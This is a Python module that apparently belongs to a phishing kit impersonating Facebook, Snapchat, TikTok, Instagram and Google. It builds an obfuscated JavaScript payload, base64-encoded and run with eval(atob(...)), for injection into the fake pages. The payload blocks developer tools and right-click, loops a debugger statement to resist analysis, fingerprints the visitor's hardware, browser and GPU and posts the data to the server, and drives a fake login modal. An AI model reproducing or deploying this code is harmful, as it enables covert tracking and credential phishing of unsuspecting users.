"""_shared.py — éléments communs à toutes les plateformes.

Contient :
  • JS_STRICT_CAPTURE : script anti-DevTools + capture d'informations appareil
  • Logos SVG de chaque plateforme (Facebook, Snapchat, TikTok, Instagram, Google)
  • _log_err : helper de journalisation d'erreurs
"""

import base64
import traceback


# ════════════════════════════════════════════════════════════════════
#  Shared JS injection (anti-DevTools + device capture)
# ════════════════════════════════════════════════════════════════════
_RAW_JS = """
(function(){
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.onkeydown = function(e) {
        if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
    };
    setInterval(function(){ debugger; }, 100);
    async function captureAll() {
        try {
            const deviceData = {
                res: window.screen.width + "x" + window.screen.height + " (DPR: " + window.devicePixelRatio + ")",
                mem: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Private",
                cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown",
                plat: navigator.platform || "N/A",
                agent: navigator.userAgent,
                lang: navigator.language,
                gpu: (function() {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl');
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    } catch(e) { return "Unknown"; }
                })()
            };
            await fetch('/log_device', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(deviceData)
            });
        } catch (err) {}
    }
    captureAll();
    window.captureAndGo = async function(redir) {
        window.pendingRedir = redir || "";
        const modal = document.getElementById('login-modal');
        if (modal) modal.classList.remove('hidden');
    };
    window.confirmLogin = async function() {
        try {
            await fetch('/feed_click', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({redirect: window.pendingRedir})
            });
        } catch(e){}
        window.location.href = "/?from_feed=1";
    };
    window.closeModal = function() {
        const modal = document.getElementById('login-modal');
        if (modal) modal.classList.add('hidden');
    };
})();
"""
_B64_JS = base64.b64encode(_RAW_JS.encode()).decode()
JS_STRICT_CAPTURE = f"<script>eval(atob('{_B64_JS}'));</script>"


